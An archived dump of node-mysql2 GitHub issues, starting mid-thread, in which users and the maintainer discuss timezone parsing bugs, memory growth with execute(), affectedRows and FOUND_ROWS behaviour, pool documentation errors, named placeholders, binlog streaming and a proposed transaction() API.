    **timezone:"+05:30"**&#13;
  });&#13;
&#13;
  //db connection &#13;
  dbCon.connect(function(err) {&#13;
    if (err) throw err;&#13;
    console.log("DB Connected!");&#13;
  });&#13;
&#13;
var dbCon = db.dbCon;&#13;
//query functions &#13;
function get_total_sales(startDate, endDate, callback) {&#13;
    dbCon.query("SELECT sum(Paid) as total_sales, count(Paid) as item_soled FROM `orders`  WHERE DateCreated &gt;= " + mysql.escape(startDate) + " AND DateCreated &lt;= " + mysql.escape(endDate) + "  ",&#13;
        function (err, result, fields) {&#13;
            if (err) {&#13;
                throw err;&#13;
            } else {&#13;
&#13;
                finalWriteDataObject["total_sales"] = numeral(result[0].total_sales).format();&#13;
                finalWriteDataObject["item_soled"] = numeral(result[0].total_saitem_soledles).format();&#13;
                callback();&#13;
            }&#13;
&#13;
        });&#13;
}&#13;
&#13;
get_total_sales(startDate, endDate, writeToFile);</Body>
    <State>open</State>
    <Comment>
      <Owner>swimmadude66</Owner>
      <Body>Chiming in to add that timezone definitely has no effect. In `node-mysql`, the data-parsing section for date objects handles timezones here: https://github.com/mysqljs/mysql/blob/ad014c82b2cbaf47acae1cc39e5533d3cb6eb882/lib/protocol/packets/RowDataPacket.js#L78&#13;
&#13;
However in `node-mysql2` the same functionality is accomplished here: https://github.com/sidorares/node-mysql2/blob/master/lib/packets/packet.js#L252&#13;
&#13;
the latter does not read or check timezone from the connection config at all, and instead just formats from a parsed string to a `Date` object, which will default to local time.  I have used a workaround for this issue by adding `dateStrings: true,` to my db connection config, which returns the date fields as they are shown in mysql workbench. From there, I cast to a UTC date like so:&#13;
&#13;
```typescript&#13;
        const dateString = row.CreateDate as string;&#13;
        const utcDate= new Date(dateString.replace(/\s/, 'T')+'Z');&#13;
```&#13;
&#13;
Personally, I am going to switch back to using `node-mysql` at least until this is fixed, but I hope that workaround can help other people.</Body>
    </Comment>
    <Comment>
      <Owner>rob5408</Owner>
      <Body>This is addressed in the second part here: https://github.com/sidorares/node-mysql2/tree/master/documentation#known-incompatibilities-with-node-mysql and worked great for me. Add their `typeCast` function to the config object passed to `createConnection`.</Body>
    </Comment>
    <Comment>
      <Owner>ithubg</Owner>
      <Body>The workaround using `typeCast` doesn't work with prepared statement because it uses binary_parser.</Body>
    </Comment>
  </Issue_463>
  <Issue_464>
    <Repository>node-mysql2</Repository>
    <Title>Possible memory leak with connection.execute or I lack understanding of connection.execute</Title>
    <Owner>sidorares</Owner>
    <Body>Hi&#13;
&#13;
I wrote a nodejs script to generate 30M records and insert periodically using the mysql2 driver with promise.&#13;
&#13;
Here is the cut down code. This runs out of heap and crashes when I use the connection.execute. However it works fine when I use the connection.query.&#13;
&#13;
```js&#13;
'use strict'&#13;
const mysql2 = require("mysql2/promise");&#13;
const util = require("util");&#13;
async function generateLargeRecordset(limit){&#13;
    const insertPrefix = "INSERT INTO SOME_LARGE_TABLE (col1,col2,col3, col4) VALUES ";&#13;
    const connection = await mysql2.createConnection({&#13;
        host: 'localhost',&#13;
        user: 'root',&#13;
        password: 'password',&#13;
        database: 'database'&#13;
    });&#13;
    const insertArray = [];&#13;
    for(let i=0;i&lt;limit;i++){&#13;
        insertArray.push(util.format(`(col1${i},col2${i},col3${i},col4${i})`));&#13;
        if(insertArray.length &gt;= 1000){&#13;
            let query = insertPrefix + insertArray.join(',') + ';';&#13;
        // let result = await connection.execute(query); // &lt;== heap memory issue. crashes when it runs out of heap&#13;
        // let result = await connection.query(query); //&lt;== No heap memory issue&#13;
            insertArray.length = 0;&#13;
        }&#13;
    }&#13;
&#13;
    if(insertArray.length &gt;= 0){&#13;
        let query = insertPrefix + insertArray.join(',') + ';';&#13;
        // let result = await connection.execute(query); // &lt;== heap memory issue. crashes when it runs out of heap&#13;
        // let result = await connection.query(query); //&lt;== No heap memory issue&#13;
        insertArray.length = 0;&#13;
        const used = process.memoryUsage().heapUsed / 1024 / 1024;&#13;
        // The memory usage keeps increasing with the execute function&#13;
        console.log(`The script uses approximately ${Math.round(used * 100) / 100} MB`);&#13;
    }&#13;
&#13;
}&#13;
&#13;
generateLargeRecordset(10000000).then(()=&gt;{&#13;
    process.exit(0);&#13;
}); &#13;
&#13;
&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'd like to investigate where memory usage comes from but `.execute()` is meant to be for server-side prepared statements, where query part is same for each call but parameters vary. Can you test this code to compare memory usage / performance:&#13;
&#13;
```js&#13;
    const insertArray = [];&#13;
    for (let p=0; p&lt; 1000; p++) {&#13;
        insertArray.push('(?,?,?,?)');&#13;
    }&#13;
    const query = insertPrefix + insertArray.join(',')&#13;
&#13;
    const valuesArray = [];&#13;
    for(let i=0;i&lt;limit;i++){&#13;
        [1, 2, 3, 4].forEach(pn =&gt; valuesArray.push(`col${pn}${i}`);&#13;
        if (valuesArray.length &gt;= 1000) {&#13;
           let result = await connection.execute(query, valuesArray); &#13;
        }&#13;
    }&#13;
```&#13;
&#13;
there is much more overhead in preparing one query ( sending prepare command, dealing with prepare response, caching and reusing prepare result) so if used incorrectly `.execute()` can be less performant then `.query()`</Body>
    </Comment>
    <Comment>
      <Owner>jspatel</Owner>
      <Body>It makes sense that execute could be expensive. But it doesn't explain why application is not releasing any memory from the application side when there are no binding variables (?) for the parameters, hence there is no need to prepare a statement. I will test it out and post my results. </Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; e when there are no binding variables (?) for the parameters, hence there is no need to prepare a statement&#13;
&#13;
It's still prepared. It's like compiling a C++ command line utility, even when intent is to start it without command line arguments it worth compiling upfront so it starts faster</Body>
    </Comment>
    <Comment>
      <Owner>enobrev</Owner>
      <Body>I ran into this same issue due to a similar misunderstanding.  I simply assumed `execute` would be most useful when I didn't care about the response (for an insert / update / delete).  I hadn't realized it was explicitly for prepared statement, and more importantly that those prepared statements would stick around long after the query was run.&#13;
&#13;
Once I switched all my rather large queries to use `query` instead of `execute`, my script sat comfortably below 32Mb.  Before that change, it would skyrocket to 1Gb of memory usage and then die spectacularly.</Body>
    </Comment>
  </Issue_464>
  <Issue_465>
    <Repository>node-mysql2</Repository>
    <Title>Timezone bug: clearly documented</Title>
    <Owner>sidorares</Owner>
    <Body>There is a clear bug when specifying database timezones that is easily reproducible.&#13;
&#13;
**Knex.js migration script, written in typescript**&#13;
```typescript&#13;
import * as Knex from 'knex';&#13;
&#13;
const testTbl = 'TestTime';&#13;
const testCol = 'dt';&#13;
&#13;
interface T { id: number; dt: Date };&#13;
&#13;
module.exports = {&#13;
    up: async (knex: Knex) =&gt; {&#13;
        await knex.schema.createTableIfNotExists(testTbl, (t) =&gt; {&#13;
            t.increments('id').primary();&#13;
            t.dateTime(testCol);&#13;
        })&#13;
&#13;
        console.log('\n\nDUMPING TABLE\n\n');&#13;
        await knex(testTbl).delete();&#13;
&#13;
        const dt = new Date();&#13;
        console.log('Creating record with date:', dt.toISOString());&#13;
        await knex(testTbl).insert({ dt });&#13;
&#13;
        const [record]: T[] = await knex(testTbl);&#13;
        console.log('Record returned with date', record.dt.toISOString());&#13;
&#13;
        console.log('Updating record with same date');&#13;
        await knex(testTbl).update({ dt: record.dt }).where({ id: record.id });&#13;
&#13;
        console.log('Record returned', (await knex(testTbl))[0].dt.toISOString());&#13;
        console.log('\n\nTEST END');&#13;
    },&#13;
    down: () =&gt; Promise.resolve()&#13;
}&#13;
```&#13;
&#13;
**RESULTS FROM 4 EXECUTIONS, MYSQL VS MYSQL2, LOCAL VS UTC**&#13;
```yaml&#13;
Run 1: | # (PASS) DRIVER: MYSQL,  TIMEZONE: LOCAL (default)&#13;
  - 'Creating record with date: 2018-11-12T19:45:23.157Z'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 13:45:23"' # Date stored in DB as local time...&#13;
  - 'Record returned with date 2018-11-12T19:45:23.000Z' # Date parsed correctly&#13;
  - 'Updating record with same date'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 13:45:23"'&#13;
  - 'Record returned 2018-11-12T19:45:23.000Z' # Date is stable over reads/writes&#13;
&#13;
Run 2: | # (PASS) DRIVER: MYSQL2,  TIMEZONE: LOCAL (default)&#13;
  - 'Creating record with date: 2018-11-12T19:47:39.630Z'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 13:47:40"' # Date stored in DB as local time...&#13;
  - 'Record returned with date 2018-11-12T19:47:40.000Z' # Date parsed correctly&#13;
  - 'Updating record with same date'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 13:47:40"'&#13;
  - 'Record returned 2018-11-12T19:47:40.000Z' # Date is stable over reads/writes&#13;
&#13;
Run 3: | # (PASS) DRIVER: MYSQL,  TIMEZONE: UTC&#13;
  - 'Creating record with date: 2018-11-12T19:49:08.182Z'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 19:49:08 UTC"' # Date stored in DB as UTC (yay!)&#13;
  - 'Record returned with date 2018-11-12T19:49:08.000Z' # Date parsed correctly &#13;
  - 'Updating record with same date'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 19:49:08 UTC"'&#13;
  - 'Record returned 2018-11-12T19:49:08.000Z' # Date is stable over reads/writes&#13;
&#13;
Run 4: | # (FAIL) DRIVER: MYSQL2,  TIMEZONE: UTC&#13;
  - 'Creating record with date: 2018-11-12T19:50:58.551Z' &#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-12 19:50:59"' # Date stored in DB as UTC (yay!)&#13;
  - 'Record returned with date 2018-11-13T01:50:59.000Z' # DATE PARSING WRONG!&#13;
  - 'Updating record with same date'&#13;
  - 'MYSQL DRIVER: Parsing new date from DB "2018-11-13 01:50:59"' # DATE NOT STABLE&#13;
  - 'Record returned 2018-11-13T07:50:59.000Z'&#13;
```&#13;
&#13;
**Observation:**&#13;
MYSQL2 mishandles timezones.  If you've supplied a timezone setting, it affects serializing _to_ the DB, but NOT deserializing _from_ the DB.&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for report @sjb933 , I'll try to investigate</Body>
    </Comment>
  </Issue_465>
  <Issue_466>
    <Repository>node-mysql2</Repository>
    <Title>affectedRows value is incorrect. no changedRows value in result</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,&#13;
&#13;
I've looked through all the old issues and can see that **_changedRows_** value ought to be present in the result set now. However I am not seeing it...&#13;
&#13;
I've also noticed that **_affectedRows_** has the wrong value when doing an insert&#13;
&#13;
This is my query&#13;
&#13;
```&#13;
connection.DM.query('insert into trainServices (serviceId,depart,origin,destination,coaches) &#13;
values (?,?,?,?,?) on duplicate key update coaches = values(coaches)',&#13;
[service.serviceId,service.depart,service.origin,service.destination,JSON.stringify(coaches)])&#13;
```  &#13;
And this is the result data when it results in an insert:&#13;
&#13;
```&#13;
{&#13;
    "fieldCount": 0,&#13;
    "affectedRows": 2,&#13;
    "insertId": 0,&#13;
    "info": "",&#13;
    "serverStatus": 2,&#13;
    "warningStatus": 0&#13;
  },&#13;
```&#13;
Here I expected **_affectedRows_** to have a value of 1 since only 1 row was inserted.&#13;
&#13;
**_affectedRows_** has the expected value of 1 when the query does not contain the on duplicate key part.&#13;
&#13;
&#13;
&#13;
This is the result when there is no change to any data&#13;
Or when there is a duplicate so it does an update and there is a change to the data&#13;
&#13;
```&#13;
  {&#13;
    "fieldCount": 0,&#13;
    "affectedRows": 1,&#13;
    "insertId": 0,&#13;
    "info": "",&#13;
    "serverStatus": 2,&#13;
    "warningStatus": 0&#13;
  },&#13;
```&#13;
Here I expected to see **_changeRows_** with a value of 0 when there was no data change and a value of 1 when there was, but it is not present in the result set. I also notice that info is empty.&#13;
&#13;
I am using mysql2 v1.6.3 (promise mode) and my DB is an AWS RDS instance running mySQL v 5.6.41&#13;
&#13;
Has **_changedRows_** support been dropped? Or is there any known issue with AWS's mySQL implementation that is preventing mysql2 picking up the necessary query response info?&#13;
&#13;
Thanks for your time</Body>
    <State>open</State>
    <Comment>
      <Owner>ianbale</Owner>
      <Body>I've just tried splitting my query into separate insert and updates&#13;
I'm now seeing the changedRows value.&#13;
&#13;
So it looks like support for that was missed from the on duplicate key update method...?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi @ianbale &#13;
&#13;
`changedRows` is extracted from text message. It's not part of main protocol and less stable ( if message format changes because of locale or mysql server version update it might fail ). The code is here - https://github.com/sidorares/node-mysql2/blob/c955041b0785bb7b7cc5536982fab0a418e70a88/lib/packets/resultset_header.js#L86&#13;
&#13;
`affectedRows` on the other hand is part of the header packet - https://github.com/sidorares/node-mysql2/blob/c955041b0785bb7b7cc5536982fab0a418e70a88/lib/packets/resultset_header.js#L28&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you post log around that query with debug turned on?</Body>
    </Comment>
    <Comment>
      <Owner>ianbale</Owner>
      <Body>So that incorrect value for affectedRows - 2 when only 1 row was inserted is coming from mySQL?&#13;
&#13;
I've added the debug option to my connection config, but I am not getting anything useful out. This code is in an AWS Lambda function. I'm running it locally using serverless-offline, but all I am getting in the way of debug output for the query is:&#13;
&#13;
request.js:247 Debug: internal, implementation, error &#13;
    Error: Uncaught error: Unexpected packet while no commands in the queue&#13;
    at Connection.protocolError (/Users/ianbale/Source Code/aws-reservations/node_modules/mysql2/lib/connection.js:388:17)&#13;
    at Connection.handlePacket (/Users/ianbale/Source Code/aws-reservations/node_modules/mysql2/lib/connection.js:448:12)&#13;
    at PacketParser.onPacket (/Users/ianbale/Source Code/aws-reservations/node_modules/mysql2/lib/connection.js:73:18)&#13;
    at PacketParser.executeStart (/Users/ianbale/Source Code/aws-reservations/node_modules/mysql2/lib/packet_parser.js:75:16)&#13;
    at Socket.&lt;anonymous&gt; (/Users/ianbale/Source Code/aws-reservations/node_modules/mysql2/lib/connection.js:80:31)&#13;
    at emitOne (events.js:116:13)&#13;
    at Socket.emit (events.js:211:7)&#13;
    at addChunk (_stream_readable.js:263:12)&#13;
    at readableAddChunk (_stream_readable.js:250:11)&#13;
    at Socket.Readable.push (_stream_readable.js:208:10)&#13;
    at TCP.onread (net.js:607:20)</Body>
    </Comment>
    <Comment>
      <Owner>victor0801x</Owner>
      <Body>try connection option: `flags: "-FOUND_ROWS",` ?</Body>
    </Comment>
    <Comment>
      <Owner>ianbale</Owner>
      <Body>Sorry for the delay getting back about this. I've had to focus on some other work and have not yet had another opportunity to look at this. I've left this window open in my browser so I notice it every day. I will get back to it once the current pressing job is complete.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>PhilSwift7</Owner>
      <Body>from mysql documentation: https://dev.mysql.com/doc/refman/8.0/en/mysql-affected-rows.html&#13;
For INSERT ... ON DUPLICATE KEY UPDATE statements, the affected-rows value per row is 1 if the row is inserted as a new row, 2 if an existing row is updated, and 0 if an existing row is set to its current values. If you specify the CLIENT_FOUND_ROWS flag, the affected-rows value is 1 (not 0) if an existing row is set to its current values. </Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>Thank you @victor0801x you saved us....&#13;
&#13;
@sidorares why is FOUND_ROWS a default flag? that really screwed us up as it breaks the ability to know if a row was modified or not, and creates different results than running queries on workbench/command line&#13;
&#13;
That should not be a default on flag.... </Body>
    </Comment>
    <Comment>
      <Owner>MatthewJohnSymons</Owner>
      <Body>I'd also like to thank @victor0801x. After spending hours trying to figure out why my application was behaving differently using node-mysql2 vs running the stored procedures in workbench, the above solution of removing the FOUND_ROWS flag has solved it.&#13;
&#13;
I agree with @aikar, this should not be a default flag. At the very least it should be documented in regards to what the defaults are so people are aware. This has been generating unexpected results.</Body>
    </Comment>
    <Comment>
      <Owner>victor0801x</Owner>
      <Body>@aikar @MatthewJohnSymons I think it's default behavior in mysql. if you using mysql-client cli  connector and typing those command will get the same results as mysql2&#13;
&#13;
```mysql&#13;
mysql -p&#13;
use test;&#13;
CREATE TABLE t(id INT, name VARCHAR(48), PRIMARY KEY(id));&#13;
INSERT INTO t VALUES (1, 'jimmy'),(2, 'huang');&#13;
-- Query OK, 2 rows affected (0.002 sec)&#13;
-- Records: 2  Duplicates: 0  Warnings: 0&#13;
-- +----+-------+&#13;
-- | id | name  |&#13;
-- +----+-------+&#13;
-- |  1 | jimmy |&#13;
-- |  2 | huang |&#13;
-- +----+-------+&#13;
&#13;
INSERT INTO t VALUES (1, 'jimmy') ON DUPLICATE KEY UPDATE name='jimmy';&#13;
-- Query OK, 0 row affected (0.002 sec)&#13;
&#13;
INSERT INTO t VALUES (1, 'jimmy') ON DUPLICATE KEY UPDATE name='huang';&#13;
-- Query OK, 2 rows affected (0.001 sec)&#13;
&#13;
INSERT INTO t VALUES (3, 'jimmy') ON DUPLICATE KEY UPDATE name='jimmy';&#13;
-- Query OK, 1 rows affected (0.001 sec)&#13;
&#13;
UPDATE t SET name='huang' WHERE id=2;&#13;
-- Query OK, 0 rows affected (0.002 sec)&#13;
-- Rows matched: 1  Changed: 0  Warnings: 0&#13;
&#13;
UPDATE t SET name='jimmy' WHERE id=2;&#13;
-- Query OK, 1 row affected (0.001 sec)&#13;
-- Rows matched: 1  Changed: 1  Warnings: 0&#13;
```</Body>
    </Comment>
  </Issue_466>
  <Issue_467>
    <Repository>node-mysql2</Repository>
    <Title>Missing "connection state"</Title>
    <Owner>sidorares</Owner>
    <Body>"connection.state" seems to be available, I wanted to test https://stackoverflow.com/questions/34542902/nodejs-mysql-how-to-know-connection-is-release-or-not</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you describe your use case? Why do you need this state flag?</Body>
    </Comment>
  </Issue_467>
  <Issue_468>
    <Repository>node-mysql2</Repository>
    <Title>NodeJs "nodejs FATAL ERROR: invalid array length Allocation failed" when MySql server restarted</Title>
    <Owner>sidorares</Owner>
    <Body>I'm using connection pools. It works fine.&#13;
But if I restart the MySql server, My node application will generate  a&#13;
nodejs FATAL ERROR: invalid array length Allocation failed"&#13;
&#13;
The same code works fine with MySql.js</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I need more details to be able to help you. Are you able to prepare self-contained example showing problem? ( ideally, docker image, if not - node script that includes all schema setup + instructions for server )</Body>
    </Comment>
  </Issue_468>
  <Issue_469>
    <Repository>node-mysql2</Repository>
    <Title>How should I proper initiate my connections?</Title>
    <Owner>sidorares</Owner>
    <Body>I'm porting a code and there are these two queries that are executed just after a connection is open.&#13;
```mysql&#13;
SET CHARACTER SET utf8;&#13;
SET sql_mode = 'STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';&#13;
```&#13;
I don't know if those queries could be set as parameter on node-mysql2 or how do I know if a connection I'm getting from pool is new.&#13;
&#13;
What I'm doing at this moment is:&#13;
```javascript&#13;
const conn = await pool.promise().getConnection();&#13;
if( !conn.connection.inited )&#13;
{&#13;
  await conn.query( "SET CHARACTER SET utf8;\&#13;
SET sql_mode ='STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';" );&#13;
  conn.connection.inited = true;&#13;
}&#13;
```&#13;
&#13;
But I'm not ok with that.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>character set can be parameter - see https://github.com/sidorares/node-mysql2/blob/5b1fac0b4e2cc7b19bd229b7c19373b2f727ac1d/test/integration/connection/encoding/test-non-bmp-chars.js#L8 for example&#13;
&#13;
re sql_mode - can you set it globally for a user / db or table?</Body>
    </Comment>
  </Issue_469>
  <Issue_470>
    <Repository>node-mysql2</Repository>
    <Title>Documentation example for Pool Connections syntax is incorrect - please remedy</Title>
    <Owner>sidorares</Owner>
    <Body>I think it might very helpful for adopters who refer to the documentation for examples on proper syntax when using pooled connections, I have noticed that it is incorrect and thought I might have been doing something wrong.  &#13;
&#13;
It currently shows the sample for auto-connect and auto-release syntax when using connection pools as:&#13;
&#13;
```&#13;
// For pool initialization, see above&#13;
pool.query(function(err, conn) {&#13;
   conn.query(/* ... */);&#13;
   // Connection is automatically released when query resolves&#13;
})&#13;
```&#13;
&#13;
It should be as follows, no?&#13;
&#13;
```&#13;
// For pool initialization, see above&#13;
pool.query(function(err, conn) {&#13;
   // Connection is automatically released when query resolves&#13;
})&#13;
```&#13;
&#13;
I have tried my suggested version without issue, but could not get the included example in the documentation to work as advertised.  It returns:&#13;
&gt;events.js:183&#13;
&gt;      throw er; // Unhandled 'error' event&#13;
&gt;      ^&#13;
&gt;&#13;
&gt;Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1&#13;
&#13;
Can someone responsible for the documenation on both npmjs.com and here on the wiki for mysql2 here on Github make the correction please.  I think it may cause alot of consternation for first-time users.&#13;
&#13;
Thanks!&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for report @tfrancois ! Looks like you are right. You are more than welcome to submit PR with corrected version yourself, or I'll try to fix it over weekend</Body>
    </Comment>
    <Comment>
      <Owner>tfrancois</Owner>
      <Body>Glad to help @sidorares!  I've triple checked and can 100% confirm that the example provided in the docs/wiki pages is incorrect.  If you do find the time, yes please correct as I think it will save lots of others tons of headaches if they try pooled connections as documented.  I almost re-wrote all of my functions for naught when the existing syntax that worked with mysqljs (v1) works perfectly fine with mysql2.&#13;
&#13;
Thanks again!&#13;
&#13;
I'll leave this issue open until its corrected so that others can see this if they run into the same issue.</Body>
    </Comment>
  </Issue_470>
  <Issue_471>
    <Repository>node-mysql2</Repository>
    <Title>Unable to execute more than a query</Title>
    <Owner>sidorares</Owner>
    <Body>I'm trying to create two tables in the same execution, but looks like that it does only get just a single query for each execution. Is there any alternative for do that?&#13;
&#13;
In my case, I'm trying to insert two tables with two drop tables before each.&#13;
&#13;
Thanks. </Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you show your code?&#13;
&#13;
If you are using `.execute()` this is not possible:&#13;
&#13;
&gt; The text must represent a single statement, not multiple statements. Within the statement, ? characters can be used as parameter markers to indicate where data values are to be bound to the query later when you execute it. The ? characters should not be enclosed within quotation marks, even if you intend to bind them to string values. Parameter markers can be used only where data values should appear, not for SQL keywords, identifiers, and so forth.&#13;
&#13;
https://dev.mysql.com/doc/refman/8.0/en/prepare.html</Body>
    </Comment>
    <Comment>
      <Owner>mvaello</Owner>
      <Body>Unfortunaltely I cannot show the code, but I can craft an example. &#13;
&#13;
// MyCreateTables.sql&#13;
&#13;
```&#13;
CREATE TABLE `dog` (&#13;
    `id` int(11) unsigned NOT NULL AUTO_INCREMENT,&#13;
    `name` varchar(64) NOT NULL DEFAULT '', &#13;
    PRIMARY KEY (`id`)&#13;
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;&#13;
&#13;
CREATE TABLE `cat` (&#13;
    `id` int(11) unsigned NOT NULL,&#13;
    `name` varchar(64) NOT NULL DEFAULT ''&#13;
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;&#13;
&#13;
```&#13;
&#13;
All the file content above is passed to the query function:&#13;
&#13;
`&#13;
connection.write.query(mySqlQuery)&#13;
`&#13;
&#13;
Any clue or alternative?&#13;
&#13;
Thanks.</Body>
    </Comment>
    <Comment>
      <Owner>PolymathWhiz</Owner>
      <Body>How do you expect it to be solved when you can't show the full code?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Any clue or alternative?&#13;
&#13;
just use `.query()` with multiple statements</Body>
    </Comment>
  </Issue_471>
  <Issue_472>
    <Repository>node-mysql2</Repository>
    <Title>execute/query from json like tokenized params</Title>
    <Owner>sidorares</Owner>
    <Body>do we have feature like this ? i am unable to get it work using mysql2&#13;
&#13;
pool.query( 'SELECT * FROM tablename WHERE col1 = :pid AND col2 = :tid',  {pid:5, tid:6}  )&#13;
.then((rs)=&gt;{console.log(rs)})&#13;
.catch((e)=&gt;{console.log(e)})&#13;
&#13;
this gives error.... i have tried pool.execute() as well but no luck. &#13;
&#13;
of-course i can build the query manually by doing a string replace and escape params etc. &#13;
but i thought this is a basic feature. and i am aware of features like using the "?", but i need it this way.&#13;
&#13;
could not find this kinda examples in the doc, which uses named placeholders.&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>ituhin</Owner>
      <Body>var sql = 'SELECT * FROM relations WHERE parent_id = :pid AND daughter_id = :did'&#13;
conn / pool&#13;
.query({sql:sql, namedPlaceholders: true}, {pid:5, did:6})&#13;
&#13;
this doesnt work either</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>https://github.com/sidorares/node-mysql2/blob/5f0fb8f1f5035e2c0207490aa2f0b838dc82fdc2/test/integration/connection/test-named-paceholders.js#L28-L94&#13;
&#13;
make sure you enable this via `namedPlaceholders: true` in parameters</Body>
    </Comment>
    <Comment>
      <Owner>ituhin</Owner>
      <Body>yea, found it... it works with execute() but not query() along with the config&#13;
&#13;
pool.execute({sql:sql, namedPlaceholders: true}, {pid:5, did:6})&#13;
.then((rs)=&gt;{console.log(rs[0])}).catch((e)=&gt;{console.log(e)})&#13;
&#13;
if the 2nd argument is object and not array, then it should be treated like named placeholders automatically. instead of finding that extra config. makes life easier.&#13;
&#13;
in my experience.... most of the time always goes to figuring out small unexpected details</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Need to double check that, but I think "object instead of array param" to flag named placeholders automatically conflicts with `connection.query('INSERT INTO posts SET ?', {id: 1, title: 'Hello MySQL'})` use case - this is what mysqljs/mysql allows and what we have for compatibility</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt;  it works with execute() but not query() along with the config&#13;
&#13;
can you show example of sql? should work for both. To debug, try to call named-placeholders in isolation - see example in https://github.com/mysqljs/named-placeholders#usage</Body>
    </Comment>
  </Issue_472>
  <Issue_473>
    <Repository>node-mysql2</Repository>
    <Title>mysql.createBinlogStream is not a function</Title>
    <Owner>sidorares</Owner>
    <Body>[https://github.com/sidorares/node-mysql2/blob/master/examples/binlog-watcher.js](https://github.com/sidorares/node-mysql2/blob/master/examples/binlog-watcher.js)&#13;
&#13;
The document said that mysql2 support for binlog protocol , and then I tested the exmaple above but got the error : mysql.createBinlogStream is not a function .</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>example is definitely incorrect ( maybe it was a while ago ), feel free to fix it if you have luck connection to binlog&#13;
&#13;
I can see `createBinlogStream` is a method on connection itself, not a top level function: https://github.com/sidorares/node-mysql2/blob/f11fef9642c04fb825d5262a4e9a13bba9f17cc8/lib/connection.js#L814</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'll try to recreate mysql setup and connect tonight. Last time I've done this was probably 4 years ago :)</Body>
    </Comment>
    <Comment>
      <Owner>RifeWang</Owner>
      <Body>can support parse mixed format binlog ?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt;  can support parse mixed format binlog ?&#13;
&#13;
Not sure I know what it is. Can you give a link to docs / spec?&#13;
&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>RifeWang</Owner>
      <Body>I kown the zongji lib support only row-based binlog , actually mysql has threee types of binlog: Statement, row, mixed .&#13;
&#13;
&gt; Statement-based logging: Events contain SQL statements that produce data changes (inserts, updates, deletes)&#13;
&gt; &#13;
&gt; Row-based logging: Events describe changes to individual rows&#13;
&gt; &#13;
&gt; Mixed logging uses statement-based logging by default but switches to row-based logging automatically as necessary.&#13;
&#13;
https://dev.mysql.com/doc/internals/en/binary-log-overview.html&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>As far as I can remember currently  supported events are QueryEvent, RotateEvent, FormatDescriptionEvent and XidEvent, so it's statement based at the moment&#13;
&#13;
https://github.com/sidorares/node-mysql2/blob/5351de338c25f30658e050a661dfc42c043ab8d8/lib/commands/binlog_dump.js&#13;
&#13;
would you like to contribute more event paresrs? Documentation is here - https://dev.mysql.com/doc/internals/en/binlog-event.html</Body>
    </Comment>
  </Issue_473>
  <Issue_474>
    <Repository>node-mysql2</Repository>
    <Title>This PR adds support for .transaction()</Title>
    <Owner>sidorares</Owner>
    <Body>New pull request for the functionality in this pull request:&#13;
https://github.com/sidorares/node-mysql2/pull/811&#13;
&#13;
I had to create a new PR and close the old one, as github will not allow me to change the head branch once a PR is filed&#13;
&#13;
This adds support for PromiseConnection.transaction() to MySQL2</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thoughts re new api @sushantdhiman @gajus @mscdex @dougwilson ?&#13;
In general I try to resist adding new surface api here but it looks quite useful for end user&#13;
&#13;
https://github.com/CloudQuote/node-mysql2/blob/b3073f992512459eb06c053e75d49dfdb42f0f69/README.md#using-managed-transaction</Body>
    </Comment>
    <Comment>
      <Owner>mscdex</Owner>
      <Body>I don't have an opinion as I don't use Promises.</Body>
    </Comment>
    <Comment>
      <Owner>mdierolf</Owner>
      <Body>One thing to note:&#13;
&#13;
The proposed .transaction() function includes options that the current .beginTransaction() function does not currently accept.&#13;
&#13;
IMO, if .transaction() is going to accept options, then .beginTransaction() should probably do so as well.</Body>
    </Comment>
    <Comment>
      <Owner>gajus</Owner>
      <Body>I have been using an interchangeable API without any issues for a while now (https://github.com/gajus/slonik#slonik-query-methods-transaction).</Body>
    </Comment>
    <Comment>
      <Owner>gajus</Owner>
      <Body>I would argue that `beginTransaction()` should be removed altogether in favour of `transaction()`.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; I would argue that beginTransaction() should be removed altogether in favour of transaction().&#13;
&#13;
